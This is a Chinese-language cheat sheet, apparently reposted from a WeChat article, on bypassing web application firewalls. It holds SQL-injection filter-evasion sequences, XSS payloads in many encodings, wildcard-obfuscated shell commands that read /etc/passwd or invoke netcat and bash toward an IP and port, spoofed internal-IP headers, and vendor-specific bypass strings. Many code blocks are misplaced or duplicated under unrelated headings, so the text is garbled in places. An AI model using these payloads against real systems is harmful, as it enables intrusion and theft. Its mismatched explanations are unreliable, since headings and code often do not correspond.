> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/JkzwNUAQro5bJXKt5WWVOA)

### **0X00    Fuzz / 爆破**  

**fuzz 字典**

**1.Seclists/Fuzzing**

https://github.com/danielmiessler/SecLists/tree/master/Fuzzing

**2.Fuzz-DB/Attack**

https://github.com/fuzzdb-project/fuzzdb/tree/master/attack

**3.Other Payloads 可能会被 ban ip，小心为妙。**

https://github.com/foospidy/payloads

### **0X01    正则绕过**

多少 waf 使用正则匹配。

#### 黑名单检测 / bypass

**Case**: SQL 注入

##### • Step 1:

```
过滤关键词: and, or, union可能正则: preg_match('/(and|or|union)/i', $id)被拦截的语句: union select user, password from usersbypass语句: 1 || (select user from users where user_id = 1) = 'admin'
```

• Step 2:

```
过滤关键词: and, or, union, where被拦截的语句: 1 || (select user from users where user_id = 1) = 'admin'bypass语句: 1 || (select user from users limit 1) = 'admin'
```

• Step 3:

```
过滤关键词: and, or, union, where, limit被拦截的语句: 1 || (select user from users limit 1) = 'admin'bypass语句: 1 || (select user from users group by user_id having user_id = 1) = 'admin'
```

• Step 4:

```
过滤关键词: and, or, union, where, limit, group by被拦截的语句: 1 || (select user from users group by user_id having user_id = 1) = 'admin'bypass语句: 1 || (select substr(group_concat(user_id),1,1) user from users ) = 1
```

• Step 5:  

```
过滤关键词: and, or, union, where, limit, group by, select被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1bypass语句: 1 || 1 = 1 into outfile 'result.txt'bypass语句: 1 || substr(user,1,1) = 'a'
```

• Step 6:

```
过滤关键词: and, or, union, where, limit, group by, select, '被拦截的语句: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1bypass语句: 1 || user_id is not nullbypass语句: 1 || substr(user,1,1) = 0x61bypass语句: 1 || substr(user,1,1) = unhex(61)
```

• Step 7:

```
过滤关键词: and, or, union, where, limit, group by, select, ', hex被拦截的语句: 1 || substr(user,1,1) = unhex(61)bypass语句: 1 || substr(user,1,1) = lower(conv(11,10,36))
```

• Step 8:

```
过滤关键词: and, or, union, where, limit, group by, select, ', hex, substr被拦截的语句: 1 || substr(user,1,1) = lower(conv(11,10,36))bypass语句: 1 || lpad(user,7,1)
```

• Step 9:

```
过滤关键词: and, or, union, where, limit, group by, select, ', hex, substr, white space被拦截的语句: 1 || lpad(user,7,1)bypass语句: 1%0b||%0blpad(user,7,1)
```

### **0X02        混淆 / 编码**

**1. 大小写**

```
标准: <script>alert()</script>Bypassed: <ScRipT>alert()</sCRipT>标准: SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'Bypassed: sELecT * FrOm all_tables whERe OWNER = 'DATABASE_NAME'
```

**2. URL 编码**

```
被阻断语句: <svG/x=">"/oNloaD=confirm()//Bypassed: %3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F被阻断语句: uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)Bypassed: uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29
```

**3. Unicode 编码**

```
标准: <marquee onstart=prompt()>混淆: <marquee onstart=\u0070r\u06f\u006dpt()>被阻断语句: /?redir=http://google.comBypassed: /?redir=http://google。com (Unicode 替代)被阻断语句: <marquee loop=1 onfinish=alert()>xBypassed: ＜marquee loop＝1 onfinish＝alert︵1)>x (Unicode 替代)TIP: 查看这些说明 this and this reports on HackerOne. :)
```

**4. HTML 实体编码**

```
标准: "><img src=x onerror=confirm()>Encoded: "><img src=x onerror=confirm()> (General form)Encoded: "><img src=x onerror=confirm()> (Numeric reference)
```

**5. 混合编码**

```
Sometimes, WAF rules often tend to filter out a specific type of encoding.This type of filters can be bypassed by mixed encoding payloads.Tabs and newlines further add to obfuscation.
```

**混淆**:

```
<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
```

**7. 双重 URL 编码**

```
这个需要服务端多次解析了url编码标准: http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\混淆: http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\标准: <script>alert()</script>混淆: %253Cscript%253Ealert()%253C%252Fscript%253E
```

**8. 通配符使用**

```
用于linux命令语句注入，通过shell通配符绕过标准: /bin/cat /etc/passwd混淆: /???/??t /???/??ss??Used chars: / ? t s标准: /bin/nc 127.0.0.1 1337混淆: /???/n? 2130706433 1337Used chars: / ? n [0-9]
```

**9. 动态 payload 生成**

```
标准: <script>alert()</script>混淆: <script>eval('al'+'er'+'t()')</script>标准: /bin/cat /etc/passwd混淆: /bi'n'''/c''at' /e'tc'/pa''ss'wdBash allows path concatenation for execution.标准: <iframe/onload='this["src"]="javascript:alert()"';>混淆: <iframe/onload='this["src"]="jav"+"as	cr"+"ipt:al"+"er"+"t()"';>
```

**9. 垃圾字符**

```
Normal payloads get filtered out easily.Adding some junk chars helps avoid detection (specific cases only).They often help in confusing regex based firewalls.标准: <script>alert()</script>混淆: <script>+-+-1-+-+alert(1)</script>标准: <BODY onload=alert()>混淆: <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert()>
```

> **NOTE:** 上述语句可能会破坏正则的匹配，达到绕过。

```
标准: <a href=javascript;alert()>ClickMeBypassed: <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>ClickMe
```

**10. 插入换行符**

```
部分waf可能会对换行符没有匹配标准: <iframe src=javascript:confirm(0)">混淆: <iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(0)">
```

**11. 未定义变量**

```
bash 和 perl 执行脚本中加入未定义变量，干扰正则。
```

> **TIP:** 随便写个不存在的变量就好。`$aaaa,$sdayuhjbsad,$dad2ed`都可以。

```
Level 1 Obfuscation: Normal标准: /bin/cat /etc/passwd混淆: /bin/cat$u /etc/passwd$uLevel 2 Obfuscation: Postion Based标准: /bin/cat /etc/passwd混淆: $u/bin$u/cat$u $u/etc$u/passwd$uLevel 3 Obfuscation: Random characters标准: /bin/cat /etc/passwd混淆: $aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff一个精心制作的payload$sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsiudf
```

**12. Tab 键和换行符**

```
大多数waf匹配的是空格不是Tab标准: <IMG SRC="javascript:alert();">Bypassed: <IMG SRC=" javascript:alert();">变形: <IMG SRC=" jav ascri pt:alert ();">标准: http://test.com/test?id=1 union select 1,2,3标准: http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3标准: <iframe src=javascript:alert(1)></iframe>混淆:<iframe    src=j	a	v	a	s	c	r	i	p	t	:a	l	e	r	t	%28	1	%29></iframe>
```

**13. Token Breakers(翻译不了 看起来说的就是 sql 注入闭合)**

```
Attacks on tokenizers attempt to break the logic of splitting a request into tokens with the help of token breakers.Token breakers are symbols that allow affecting the correspondence between an element of a string and a certain token, and thus bypass search by signature.However, the request must still remain valid while using token-breakers.
```

```
Case: Unknown Token for the TokenizerPayload: ?id=‘-sqlite_version() UNION SELECT password FROM users --Case: Unknown Context for the Parser (Notice the uncontexted bracket)Payload 1: ?id=123);DROP TABLE users --Payload 2: ?id=1337) INTO OUTFILE ‘xxx’ --
```

> **TIP:** 更多 payload 可以看这里 cheat sheet.

**14. 其他格式混淆**

```
许多web应用程序支持不同的编码类型(如下表)混淆成服务器可解析、waf不可解析的编码类型
```

**Case:** IIS

```
IIS6, 7.5, 8 and 10 (ASPX v4.x) 允许 IBM037 字符可以发送编码后的参数名和值
```

原始请求:

```
POST /sample.aspx?id1=something HTTP/1.1HOST: victim.comContent-Type: application/x-www-form-urlencoded; charset=utf-8Content-Length: 41id2='union all select * from users--
```

混淆请求 + URL Encoding:

```
POST /sample.aspx?%89%84%F1=%A2%96%94%85%A3%88%89%95%87 HTTP/1.1HOST: victim.comContent-Type: application/x-www-form-urlencoded; charset=ibm037Content-Length: 115%89%84%F2=%7D%A4%95%89%96%95%40%81%93%93%40%A2%85%93%85%83%A3%40%5C%40%86%99%96%94%40%A4%A2%85%99%A2%60%60
```

> **TIP:** 可以使用 这个小脚本 来转化编码

```
import urllib.parse, sysfrom argparse import ArgumentParserlackofart = '''        OBFUSCATOR'''def paramEncode(params="", charset="", encodeEqualSign=False, encodeAmpersand=False, urlDecodeInput=True, urlEncodeOutput=True):    result = ""    equalSign = "="    ampersand = "&"    if '=' and '&' in params:        if encodeEqualSign:            equalSign = equalSign.encode(charset)        if encodeAmpersand:            ampersand = ampersand.encode(charset)        params_list = params.split("&")        for param_pair in params_list:            param, value = param_pair.split("=")            if urlDecodeInput:                param = urllib.parse.unquote(param)                value = urllib.parse.unquote(value)            param = param.encode(charset)            value = value.encode(charset)            if urlEncodeOutput:                param = urllib.parse.quote_plus(param)                value = urllib.parse.quote_plus(value)            if result:                result += ampersand            result += param + equalSign + value    else:        if urlDecodeInput:            params = urllib.parse.unquote(params)        result = params.encode(charset)        if urlEncodeOutput:            result = urllib.parse.quote_plus(result)    return resultdef main():    print(lackofart)    parser = ArgumentParser('python3 obfu.py')    parser._action_groups.pop()    # A simple hack to have required arguments and optional arguments separately    required = parser.add_argument_group('Required Arguments')    optional = parser.add_argument_group('Optional Arguments')    # Required Options    required.add_argument('-s', '--str', help='String to obfuscate', dest='str')    required.add_argument('-e', '--enc', help='Encoding type. eg: ibm037, utf16, etc', dest='enc')    # Optional Arguments (main stuff and necessary)    optional.add_argument('-ueo', help='URL Encode Output', dest='ueo', action='store_true')    optional.add_argument('-udi', help='URL Decode Input', dest='udi', action='store_true')    args = parser.parse_args()    if not len(sys.argv) > 1:        parser.print_help()        quit()    print('Input: %s' % (args.str))    print('Output: %s' % (paramEncode(params=args.str, charset=args.enc, urlDecodeInput=args.udi, urlEncodeOutput=args.ueo)))if __name__ == '__main__':    main()
```

<table width="677"><thead><tr><th width="95">服务器信息</th><th width="54">可用编码</th><th width="370">说明</th></tr></thead><tbody><tr><td width="87">Nginx, uWSGI-Django-Python3</td><td width="54">IBM037, IBM500, cp875, IBM1026, IBM273</td><td width="370">对参数名和参数值进行编码<br>服务器会对参数名和参数值均进行 url 解码<br>需要对等号和 &amp; and 进行编码 (不进行 url 编码)</td></tr><tr><td width="87">Nginx, uWSGI-Django-Python2</td><td width="54">IBM037, IBM500, cp875, IBM1026, utf-16, utf-32, utf-32BE, IBM424</td><td width="370">对参数名和参数值进行便慢慢<br>服务器会对参数名和参数值均进行 url 解码<br>等号和 &amp; 符号不应该以任何方式编码。</td></tr><tr><td width="87">Apache-TOMCAT8-JVM1.8-JSP</td><td width="54">IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM290, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025</td><td width="370">参数名按原始格式 (可以像往常一样使用 url 编码)<br>Body 不论是否经过 url 编码均可<br>等号和 &amp; 符号不应该以任何方式编码</td></tr><tr><td width="87">Apache-TOMCAT7-JVM1.6-JSP</td><td width="54">IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025</td><td width="370">参数名按原始格式 (可以像往常一样使用 url 编码)<br>Body 不论是否经过 url 编码均可<br>等号和 &amp; 符号不应该以任何方式编码</td></tr><tr><td width="87">IIS6, 7.5, 8, 10 -ASPX (v4.x)</td><td width="54">IBM037, IBM500, IBM870, cp875, IBM1026, IBM01047, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, unicodeFFFE, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM290, IBM297, IBM420,IBM423, IBM424, x-EBCDIC-KoreanExtended, IBM-Thai, IBM871, IBM880, IBM905, IBM00924, cp1025</td><td width="361">参数名按原始格式 (可以像往常一样使用 url 编码)<br>Body 不论是否经过 url 编码均可<br>等号和 &amp; 符号不应该以任何方式编码</td></tr></tbody></table>

### **0X04        HTTP 参数污染**

#### 手法

```
import urllib.parse, sysfrom argparse import ArgumentParserlackofart = '''        OBFUSCATOR'''def paramEncode(params="", charset="", encodeEqualSign=False, encodeAmpersand=False, urlDecodeInput=True, urlEncodeOutput=True):    result = ""    equalSign = "="    ampersand = "&"    if '=' and '&' in params:        if encodeEqualSign:            equalSign = equalSign.encode(charset)        if encodeAmpersand:            ampersand = ampersand.encode(charset)        params_list = params.split("&")        for param_pair in params_list:            param, value = param_pair.split("=")            if urlDecodeInput:                param = urllib.parse.unquote(param)                value = urllib.parse.unquote(value)            param = param.encode(charset)            value = value.encode(charset)            if urlEncodeOutput:                param = urllib.parse.quote_plus(param)                value = urllib.parse.quote_plus(value)            if result:                result += ampersand            result += param + equalSign + value    else:        if urlDecodeInput:            params = urllib.parse.unquote(params)        result = params.encode(charset)        if urlEncodeOutput:            result = urllib.parse.quote_plus(result)    return resultdef main():    print(lackofart)    parser = ArgumentParser('python3 obfu.py')    parser._action_groups.pop()    # A simple hack to have required arguments and optional arguments separately    required = parser.add_argument_group('Required Arguments')    optional = parser.add_argument_group('Optional Arguments')    # Required Options    required.add_argument('-s', '--str', help='String to obfuscate', dest='str')    required.add_argument('-e', '--enc', help='Encoding type. eg: ibm037, utf16, etc', dest='enc')    # Optional Arguments (main stuff and necessary)    optional.add_argument('-ueo', help='URL Encode Output', dest='ueo', action='store_true')    optional.add_argument('-udi', help='URL Decode Input', dest='udi', action='store_true')    args = parser.parse_args()    if not len(sys.argv) > 1:        parser.print_help()        quit()    print('Input: %s' % (args.str))    print('Output: %s' % (paramEncode(params=args.str, charset=args.enc, urlDecodeInput=args.udi, urlEncodeOutput=args.ueo)))if __name__ == '__main__':    main()
```

下面是相关服务器对参数解释的比较

<table width="677"><thead><tr><th width="155">环境</th><th width="69">参数解析</th><th width="190">示例</th></tr></thead><tbody><tr><td width="155">ASP/IIS</td><td width="73">用逗号连接</td><td width="193">par1=val1,val2</td></tr><tr><td width="155">JSP, Servlet/Apache Tomcat</td><td width="73">第一个参数是结果</td><td width="193">par1=val1</td></tr><tr><td width="155">ASP.NET/IIS</td><td width="73">用逗号连接</td><td width="193">par1=val1,val2</td></tr><tr><td width="155">PHP/Zeus</td><td width="73">最后一个参数是结果</td><td width="193">par1=val2</td></tr><tr><td width="155">PHP/Apache</td><td width="73">最后一个参数是结果</td><td width="193">par1=val2</td></tr><tr><td width="155">JSP, Servlet/Jetty</td><td width="73">第一个参数是结果</td><td width="193">par1=val1</td></tr><tr><td width="155">IBM Lotus Domino</td><td width="73">第一个参数是结果</td><td width="193">par1=val1</td></tr><tr><td width="155">IBM HTTP Server</td><td width="73">最后一个参数是结果</td><td width="193">par1=val2</td></tr><tr><td width="155">mod_perl, libapeq2/Apache</td><td width="73">第一个参数是结果</td><td width="193">par1=val1</td></tr><tr><td width="155">Oracle Application Server 10G</td><td width="73">第一个参数是结果</td><td width="193">par1=val1</td></tr><tr><td width="155">Perl CGI/Apache</td><td width="73">第一个参数是结果</td><td width="193">par1=val1</td></tr><tr><td width="155">Python/Zope</td><td width="73">第一个参数是结果</td><td width="193">par1=val1</td></tr><tr><td width="155">IceWarp</td><td width="73">返回一个列表</td><td width="193">[‘val1’,’val2’]</td></tr><tr><td width="155">AXIS 2400</td><td width="73">最后一个参数是结果</td><td width="193">par1=val2</td></tr><tr><td width="155">DBMan</td><td width="73">由两个波浪号连接起来</td><td width="193">par1=val1~~val2</td></tr><tr><td width="155">mod-wsgi (Python)/Apache</td><td width="73">返回一个列表</td><td width="193">ARRAY(0x8b9058c)</td></tr></tbody></table>

### **0X05        浏览器的缺陷**

#### Charset Bugs:

```
这种攻击方法基于服务器如何解释具有相同名称的参数可能造成bypass的情况:服务器使用最后接收到的参数，WAF只检查第一个参数服务器将来自类似参数的值联合起来，WAF单独检查它们
```

Example request:

```
可以尝试 修改 charset header to 更高的 Unicode (eg. UTF-32)当网站解码的时候，触发payload
```

当站点加载时，将其编码为我们设置的 UTF-32 编码，然后由于页面的输出编码为 UTF-8，将其呈现为:`"<script>alert (1) </ script>` 从而触发 xss

完整 url 编码后的 payload:

```
GET /page.php?p=∀㸀㰀script㸀alert(1)㰀/script㸀 HTTP/1.1Host: site.comUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0Accept-Charset:utf-32; q=0.5<Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate
```

#### Null 空字节

空字节通常用作字符串终止符

```
%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80
```

#### 解析错误

```
%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80
```

#### Unicode 分隔符

*   每个浏览器有不同的分隔分隔符
    

@Masato Kinugawafuzz 后发现如下

```
Payload 示例:<scri%00pt>alert(1);</scri%00pt><scri\x00pt>alert(1);</scri%00pt><s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>标准: <a href="javascript:alert()">混淆: <a href="ja0x09vas0x0A0x0Dcript:alert(1)">clickme</a>变形: <a 0x00 href="javascript:alert(1)">clickme</a>
```

示例

```
RFC 声明节点名不可以由空白起始但是我们可以使用特殊字符 ` %, //, !, ?`, etc.例子:<// style=x:expression\28write(1)\29> - Works upto IE7 (Source)<!--[if]><script>alert(1)</script --> - Works upto IE9 (Reference)<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/> - Works in IE7 (Reference)<%div%20style=xss:expression(prompt(1))> - Works Upto IE7
```

### 使用其他非典型等效语法结构替换

找的 waf 开发人员没有注意到的语句进行攻击

一些 WAF 开发人员忽略的常见关键字:

*   JavaScript functions:
    

*   `window`
    
*   `parent`
    
*   `this`
    
*   `self`
    

*   Tag attributes:
    

*   `onwheel`
    
*   `ontoggle`
    
*   `onfilterchange`
    
*   `onbeforescriptexecute`
    
*   `ondragstart`
    
*   `onauxclick`
    
*   `onpointerover`
    
*   `srcdoc`
    

SQL Operators

`lpad`

```
IExplorer: 0x09, 0x0B, 0x0C, 0x20, 0x3BChrome: 0x09, 0x20, 0x28, 0x2C, 0x3BSafari: 0x2C, 0x3BFireFox: 0x09, 0x20, 0x28, 0x2C, 0x3BOpera: 0x09, 0x20, 0x2C, 0x3BAndroid: 0x09, 0x20, 0x28, 0x2C, 0x3B
```

`field`

```
<a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>pwn3d
```

`bit_count` 二进制数中包含 1 的个数。BIT_COUNT(10); 因为 10 转成二进制是 1010，所以该结果就是 2

示例 payloads:

```
lpad( string, padded_length, [ pad_string ] ) lpad函数从左边对字符串使用指定的字符进行填充  lpad('tech', 7); 将返回' tech'  lpad('tech', 2); 将返回'te'  lpad('tech', 8, '0'); 将返回'0000tech'  lpad('tech on the net', 15, 'z'); 将返回'tech on the net'  lpad('tech on the net', 16, 'z'); 将返回'ztech on the net
```

JSFuck

JJEncode

XChars.JS

### 滥用 SSL/TLS 密码:

```
lpad( string, padded_length, [ pad_string ] ) lpad函数从左边对字符串使用指定的字符进行填充  lpad('tech', 7); 将返回' tech'  lpad('tech', 2); 将返回'te'  lpad('tech', 8, '0'); 将返回'0000tech'  lpad('tech on the net', 15, 'z'); 将返回'tech on the net'  lpad('tech on the net', 16, 'z'); 将返回'ztech on the net
```

> **Tool**: abuse-ssl-bypass-waf

### 滥用 DNS 记录:

*   找到云 waf 后的源站
    

> **TIP:** 一些在线资源 IP History 和 DNS Trails

**Tool**: bypass-firewalls-by-DNS-history

```
FIELD(str,str1,str2,str3,...)返回的索引（从1开始的位置）的str在str1，str2，STR3，...列表中。如果str没有找到，则返回0。+---------------------------------------------------------+| FIELD('ej', 'Hej', 'ej', 'Heja', 'hej', 'foo') |+---------------------------------------------------------+| 2                                                       |+---------------------------------------------------------+
```

### 请求头欺骗

让 waf 以为请求来自于内部网络，进而不对其进行过滤。

添加如下请求头

```
FIELD(str,str1,str2,str3,...)返回的索引（从1开始的位置）的str在str1，str2，STR3，...列表中。如果str没有找到，则返回0。+---------------------------------------------------------+| FIELD('ej', 'Hej', 'ej', 'Heja', 'hej', 'foo') |+---------------------------------------------------------+| 2                                                       |+---------------------------------------------------------+
```

### **Google Dorks Approach:**

应对已知 WAF 的绕过

#### 搜索语法:

#### Normal search:

`+<wafname> waf bypass`

Searching for specific version exploits:  
`"<wafname> <version>" (bypass|exploit)`

For specific type bypass exploits:  
`"<wafname>" +<bypass type> (bypass|exploit)`

On Exploit DB:  
`site:exploit-db.com +<wafname> bypass`

On 0Day Inject0r DB:  
`site:0day.today +<wafname> <type> (bypass|exploit)`

On Twitter:  
`site:twitter.com +<wafname> bypass`

On Pastebin  
`site:pastebin.com +<wafname> bypass`

**0X06    拓展 Bypass 姿势**
------------------------

### **Airlock Ergon**

```
Case: XSS<script>window['alert'](0)</script><script>parent['alert'](1)</script><script>self['alert'](2)</script>Case: SQLiSELECT if(LPAD(' ',4,version())='5.7',sleep(5),null);1%0b||%0bLPAD(USER,7,1)可以使用许多替代原生JavaScript的方法:
```

**AWS**

SQLi Bypass by @enkaskal

```
很多时候，服务器可以接收各种SSL/TLS密码和版本的连接。初始化到waf不支持的版本找出waf支持的密码(通常WAF供应商文档对此进行了讨论)。找出服务器支持的密码(SSLScan这种工具可以帮助到你)。找出服务器支持但waf不支持的
```

```
bash bypass-firewalls-by-DNS-history.sh -d <target> --checkall
```

### **Barracuda**

Cross Site Scripting by @WAFNinja

```
bash bypass-firewalls-by-DNS-history.sh -d <target> --checkall
```

HTML Injection by @Global-Evolution

```
X-Originating-IP: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Client-IP: 127.0.0.1
```

XSS Bypass by @0xInfection

```
X-Originating-IP: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Client-IP: 127.0.0.1
```

Barracuda Spam & Virus Firewall 5.1.3 - Remote Command Execution (Metasploit) by @xort

### **Cerber (WordPress)**

Username Enumeration Protection Bypass by HTTP Verb Tampering by @ed0x21son

```
SQLi Overlong UTF-8 Sequence Bypass (>= v4.2.4) by @Sec Consult%C0%80'+union+select+col1,col2,col3+from+table+--+
```

Protected Admin Scripts Bypass by @ed0x21son

```
"; select * from TARGET_TABLE --XSS Bypass by @kmkz
```

REST API Disable Bypass by @ed0x21son

```
"; select * from TARGET_TABLE --
```

### **Citrix NetScaler**

SQLi via HTTP Parameter Pollution (NS10.5) by @BGA Security

```
<script>eval(atob(decodeURIComponent("payload")))//
```

```
<script>eval(atob(decodeURIComponent("payload")))//
```

HTML Injection by @spyerror

```
<body style="height:1000px" onwheel="alert(1)"><div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)"><b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
```

XSS Bypass by @c0d3g33k

```
<body style="height:1000px" onwheel="alert(1)"><div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)"><b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
```

XSS Bypasses by @Bohdan Korzhynskyi

```
GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_USHost: favoritewaf.comUser-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
```

XSS Bypass by @RakeshMane10

```
GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe6758f31ce2d7b763e7&&et=1261217792&&locale=en_USHost: favoritewaf.comUser-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
```

XSS Bypass by @ArbazKiraak

```
<a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhereBarracuda WAF 8.0.1 - Remote Command Execution (Metasploit) by @xort
```

XSS Bypass by @Ahmet Ümit

```
<a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere
```

XSS Bypass by @Shiva Krishna

```
POST host.com HTTP/1.1Host: favoritewaf.comUser-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)author=1
```

XSS Bypass by @Brute Logic

```
POST host.com HTTP/1.1Host: favoritewaf.comUser-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)author=1
```

XSS Bypass by @RenwaX23 (Chrome only)

```
http://host/wp-admin///load-scripts.php?load%5B%5D=jquery-core,jquery-migrate,utilshttp://host/wp-admin///load-styles.php?load%5B%5D=dashicons,admin-bar
```

RCE Payload Detection Bypass by @theMiddle

```
http://host/index.php/wp-json/wp/v2/users/
```

### **Comodo**

XSS Bypass by @0xInfection

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">   <soapenv:Header/>   <soapenv:Body>        <string>’ union select current_user, 2#</string>    </soapenv:Body></soapenv:Envelope>generic_api_call.pl XSS by @NNPoster
```

SQLi by @WAFNinja

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">   <soapenv:Header/>   <soapenv:Body>        <string>’ union select current_user, 2#</string>    </soapenv:Body></soapenv:Envelope>
```

### DotDefender

Firewall disable by (v5.0) by @hyp3rlinx

```
http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%3eCloudflare
```

Remote Command Execution (v3.8-5) by @John Dos  

```
http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%3e
```

Persistent XSS (v4.0) by @EnableSecurity  

```
<div style="background:url(/f#oo/;color:red/*/foo.jpg);">X
```

R-XSS Bypass by @WAFNinja

```
<a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
```

XSS Bypass by @0xInfection  

```
<svg onload=prompt%26%230000000040document.domain)><svg onload=prompt%26%23x000000028;document.domain)>xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>1'"><img/src/onerror=.1|alert``>
```

POST - XSS Bypass (v4.02) by @DavidK  

```
<svg/onload=alert()//
```

```
<a href="j	a	v	asc
ri	pt:\u0061\u006C\u0065\u0072\u0074(this['document']['cookie'])">X</a>`
```

### **Fortinet Fortiweb**

`pcre_expression` unvaidated XSS by @Benjamin Mejri

```
<--`<img/src=` onerror=confirm``> --!>
```

CSP Bypass by @Binar10

POST Type Query

```
<--`<img/src=` onerror=confirm``> --!>
```

GET Type Query

```
javascript:{alert`0`}
```

### **F5 ASM**

XSS Bypass by @WAFNinja

```
<base href=//knoxss.me?
```

### **F5 BIG-IP**

XSS Bypass by @WAFNinja

```
<j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x
```

XSS Bypass by @Aatif Khan

```
cat$u+/etc$u/passwd$u/bin$u/bash$u <ip> <port>";cat+/etc/passwd+#
```

`report_type` XSS by @NNPoster

```
<input/oninput='new Function`confir\u006d\`0\``'><p/ondragstart=%27confirm(0)%27.replace(/.+/,eval)%20draggable=True>dragme
```

POST Based XXE by @Anonymous

```
0 union/**/select 1,version(),@@datadir
```

Directory Traversal by @Anastasios Monachos

Read Arbitrary File

```
PGVuYWJsZWQ+ZmFsc2U8L2VuYWJsZWQ+<enabled>false</enabled>
```

```
